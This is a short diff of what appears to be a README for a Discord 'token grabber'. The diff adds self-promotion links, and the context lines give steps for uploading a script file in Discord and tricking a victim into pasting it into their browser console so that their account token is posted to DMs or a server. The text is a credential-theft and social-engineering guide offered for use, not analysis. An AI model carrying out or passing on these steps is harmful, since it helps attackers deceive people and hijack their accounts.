@@ -11,3 +11,10 @@ First go to the file called  Token Grabber script.js  Open it copy the script in
 Second go to discord paste it into your text box and then press the + and press upload as file and then it will upload 
 
 Thirdly you will try to get them to paste it into there console by pressing Ctrl+Shift+i and then it will spam there discord token into the dm's or server 
+
+
+Make sure to join the discord server   https://discord.gg/wrFzprkmaS 
+
+Add my discord Takanashi#6779 
+
+Sub to my YT  Remenix-YT 
